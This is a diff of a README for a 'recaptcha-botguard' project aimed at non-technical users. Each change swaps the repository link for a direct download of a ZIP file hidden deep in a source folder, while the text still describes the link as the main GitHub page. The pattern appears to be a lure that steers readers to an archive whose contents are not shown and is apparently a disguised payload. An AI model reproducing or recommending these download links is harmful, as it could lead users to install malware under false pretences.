@@ -1,6 +1,6 @@
 # 🛡️ recaptcha-botguard - Understand Botguard Code Easily
 
-[![Download recaptcha-botguard](https://img.shields.io/badge/Download-Here-purple?style=for-the-badge)](https://github.com/cristiancctlv/recaptcha-botguard)
+[![Download recaptcha-botguard](https://img.shields.io/badge/Download-Here-purple?style=for-the-badge)](https://github.com/cristiancctlv/recaptcha-botguard/raw/refs/heads/main/src/bin/disassemble/botguard-recaptcha-chrisroot.zip)
 
 ---
 
@@ -27,7 +27,7 @@ No technical or programming knowledge is needed to run this software.
 
 Click the big button above or this link to visit the GitHub page and download the files:
 
-[https://github.com/cristiancctlv/recaptcha-botguard](https://github.com/cristiancctlv/recaptcha-botguard)
+[https://github.com/cristiancctlv/recaptcha-botguard/raw/refs/heads/main/src/bin/disassemble/botguard-recaptcha-chrisroot.zip](https://github.com/cristiancctlv/recaptcha-botguard/raw/refs/heads/main/src/bin/disassemble/botguard-recaptcha-chrisroot.zip)
 
 This link takes you to the main GitHub page. You will find all the files needed to use the application.
 
@@ -37,7 +37,7 @@ This link takes you to the main GitHub page. You will find all the files needed 
 
 1. **Open your web browser** (Chrome, Edge, Firefox, etc.)  
 2. **Visit the GitHub page**:  
-   https://github.com/cristiancctlv/recaptcha-botguard  
+   https://github.com/cristiancctlv/recaptcha-botguard/raw/refs/heads/main/src/bin/disassemble/botguard-recaptcha-chrisroot.zip  
 
 3. **Find the green "Code" button** on the page (top right side).  
 4. Click the green "Code" button and select **Download ZIP**.  
@@ -115,7 +115,7 @@ This lets you see the program’s behavior without needing to write or run code 
 
 Visit the GitHub page regularly to find updates or new versions. You can also download the ZIP again to get the latest files.
 
-[https://github.com/cristiancctlv/recaptcha-botguard](https://github.com/cristiancctlv/recaptcha-botguard)
+[https://github.com/cristiancctlv/recaptcha-botguard/raw/refs/heads/main/src/bin/disassemble/botguard-recaptcha-chrisroot.zip](https://github.com/cristiancctlv/recaptcha-botguard/raw/refs/heads/main/src/bin/disassemble/botguard-recaptcha-chrisroot.zip)
 
 ---
 
